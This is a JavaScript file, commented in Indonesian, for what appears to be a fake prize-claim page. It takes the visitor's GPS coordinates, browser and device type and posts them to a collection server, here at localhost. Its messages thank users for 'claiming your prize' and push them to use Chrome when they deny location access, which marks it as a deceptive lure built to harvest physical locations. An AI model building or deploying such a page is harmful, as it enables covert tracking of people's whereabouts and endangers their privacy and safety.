function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
    } else {
        showNotification("Geolocation is not supported by this browser.");
    }
}

function sendPosition(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    var customMessage = "Terima kasih telah mengklaim hadiah Anda!";  // Pesan kustom

    var browserName = getBrowserName();
    var currentTime = new Date().toLocaleString();
    var deviceType = getDeviceType();

    fetch('http://localhost:5000/location', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            latitude: latitude,
            longitude: longitude,
            custom_message: customMessage,
            browser_name: browserName,
            time: currentTime,
            device_type: deviceType
        }),
    })
    .then(response => response.json())
    .then(data => {
        showNotification(data.message);
    })
    .catch((error) => {
        console.error('Error:', error);
        showNotification("Server Sedang Sibuk...");
    });
}

function showError(error) {
    let message = "";
    switch(error.code) {
        case error.PERMISSION_DENIED:
            message = "Gunakan Chrome!";
            break;
        case error.POSITION_UNAVAILABLE:
            message = "Akses Lokasi Belum Disetujui!";
            break;
        case error.TIMEOUT:
            message = "The request to get user location timed out.";
            break;
        case error.UNKNOWN_ERROR:
            message = "An unknown error occurred.";
            break;
    }
    showNotification(message);
}

function showNotification(message) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.classList.add('show');
    setTimeout(() => {
        notification.classList.remove('show');
    }, 8000); // Menyembunyikan notifikasi setelah 8 detik
}

function checkCheckboxes() {
    const citizen = document.getElementById('citizen').checked;
    const robot = document.getElementById('robot').checked;
    const terms = document.getElementById('terms').checked;
    const submitBtn = document.getElementById('submitBtn');

    if (citizen && robot && terms) {
        submitBtn.disabled = false;
    } else {
        submitBtn.disabled = true;
    }
}

function getBrowserName() {
    var userAgent = navigator.userAgent;
    var browserName;

    if (userAgent.match(/chrome|chromium|crios/i)) {
        browserName = "Chrome";
    } else if (userAgent.match(/firefox|fxios/i)) {
        browserName = "Firefox";
    } else if (userAgent.match(/safari/i)) {
        browserName = "Safari";
    } else if (userAgent.match(/opr\//i)) {
        browserName = "Opera";
    } else if (userAgent.match(/edg/i)) {
        browserName = "Edge";
    } else {
        browserName = "Unknown";
    }

    return browserName;
}

function getDeviceType() {
    var deviceType;
    var userAgent = navigator.userAgent;

    if (/Mobi|Android/i.test(userAgent)) {
        deviceType = "Mobile";
    } else {
        deviceType = "Desktop";
    }

    return deviceType;
}
